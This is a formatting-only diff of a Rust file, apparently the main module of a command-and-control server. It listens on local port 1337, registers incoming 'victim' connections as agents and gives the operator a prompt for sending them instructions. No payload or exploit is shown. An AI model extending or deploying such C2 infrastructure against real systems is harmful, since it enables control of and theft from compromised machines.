@@ -1,25 +1,37 @@
 // Dependecies
-use std::{fs, net::TcpListener, path::Path, sync::{Arc, mpsc::{Receiver, Sender}}, thread::{self, sleep}};
-use rustyline::{DefaultEditor};
 use core::time;
+use rustyline::DefaultEditor;
+use std::{
+    fs,
+    net::TcpListener,
+    path::Path,
+    sync::{
+        Arc,
+        mpsc::{Receiver, Sender},
+    },
+    thread::{self, sleep},
+};
 
 // Internal modules
-mod constants;
-mod commands;
 mod c2_state;
+mod commands;
+mod constants;
 
-use constants::{RESET, DIM, WHITE, GREEN, RED, CYAN, YELLOW, OUTPATH, UiEvent};
 use c2_state::C2State;
+use constants::{CYAN, DIM, GREEN, OUTPATH, RED, RESET, UiEvent, WHITE, YELLOW};
 
 fn ensure_output_path() -> Result<(), String> {
     let path = Path::new(OUTPATH);
 
-    if !path.exists(){
+    if !path.exists() {
         match fs::create_dir(path) {
             Ok(_) => (),
             Err(e) => {
-                println!("\n\t{DIM}[{RESET}{RED}err:download{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
-                return Err(e.to_string())
+                println!(
+                    "\n\t{DIM}[{RESET}{RED}err:download{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
+                    e
+                );
+                return Err(e.to_string());
             }
         };
     }
@@ -32,15 +44,13 @@ fn handle_server_instruct(instruct: Vec<&str>, state: &C2State) -> Result<bool, 
 }
 
 fn handle_new_connection(state: Arc<C2State>, ui_tx: Sender<UiEvent>) {
-    let listener = TcpListener::bind("127.0.0.1:1337")
-        .expect("the port can not be opened...");
+    let listener = TcpListener::bind("127.0.0.1:1337").expect("the port can not be opened...");
 
     println!("\n\t{DIM}[{RESET}{WHITE}listening:{RESET}{DIM}]{RESET} {CYAN}port 1337{RESET}\n");
 
-    for stream in listener.incoming(){
+    for stream in listener.incoming() {
         match stream {
-            Ok(conn) =>  {
-                
+            Ok(conn) => {
                 // Add address to agent state
                 let Some(addr) = conn.peer_addr().ok() else {
                     eprintln!("{}[!]{} No se pudo obtener peer_addr", RED, RESET);
@@ -49,7 +59,7 @@ fn handle_new_connection(state: Arc<C2State>, ui_tx: Sender<UiEvent>) {
 
                 state.add_agent(&addr.to_string(), conn);
                 let _ = ui_tx.send(UiEvent::AgentConnected(addr.to_string()));
-            },
+            }
             Err(error) => {
                 eprintln!("Error accepting victim: {}", error)
             }
@@ -57,8 +67,7 @@ fn handle_new_connection(state: Arc<C2State>, ui_tx: Sender<UiEvent>) {
     }
 }
 
-
-fn handle_sessions(state: Arc<C2State>, ui_rx: Receiver<UiEvent>) -> Result<(), String> { 
+fn handle_sessions(state: Arc<C2State>, ui_rx: Receiver<UiEvent>) -> Result<(), String> {
     let mut rl = DefaultEditor::new().map_err(|e| e.to_string())?;
 
     loop {
@@ -67,7 +76,10 @@ fn handle_sessions(state: Arc<C2State>, ui_rx: Receiver<UiEvent>) -> Result<(), 
             while let Ok(event) = ui_rx.try_recv() {
                 match event {
                     UiEvent::AgentConnected(addr) => {
-                        println!("\n\t{DIM}[{RESET}{GREEN}conn{RESET}{DIM}]{RESET} {WHITE}{}{RESET}\n", addr);
+                        println!(
+                            "\n\t{DIM}[{RESET}{GREEN}conn{RESET}{DIM}]{RESET} {WHITE}{}{RESET}\n",
+                            addr
+                        );
                     }
                 }
             }
@@ -77,8 +89,7 @@ fn handle_sessions(state: Arc<C2State>, ui_rx: Receiver<UiEvent>) -> Result<(), 
         let prompt = constants::build_prompt(&state);
         let instruct = rl.readline(&prompt).map_err(|e| e.to_string())?;
 
-        if instruct.trim().eq_ignore_ascii_case("q") 
-            || instruct.trim().eq_ignore_ascii_case("exit") 
+        if instruct.trim().eq_ignore_ascii_case("q") || instruct.trim().eq_ignore_ascii_case("exit")
         {
             return Ok(());
         }
@@ -86,16 +97,18 @@ fn handle_sessions(state: Arc<C2State>, ui_rx: Receiver<UiEvent>) -> Result<(), 
         if !instruct.trim().is_empty() {
             let _ = rl.add_history_entry(instruct.as_str());
         }
-        
+
         match handle_server_instruct(instruct.trim().split_whitespace().collect(), &state) {
             Ok(_) => (),
-            Err(err) => { println!("An error has ocurred: {}", err); break; }
+            Err(err) => {
+                println!("An error has ocurred: {}", err);
+                break;
+            }
         };
     }
 
     Ok(())
 }
-
 
 fn main() {
     let state: Arc<C2State> = Arc::new(C2State::new());
@@ -104,10 +117,10 @@ fn main() {
     let _ = ensure_output_path();
 
     // Create thread of new connections
-    thread::spawn(move || {  handle_new_connection(listener_state, ui_tx)});
+    thread::spawn(move || handle_new_connection(listener_state, ui_tx));
     sleep(time::Duration::from_millis(200));
 
     if let Err(err) = handle_sessions(state, ui_rx) {
         eprintln!("An error has ocurred: {}", err);
-    }   
+    }
 }
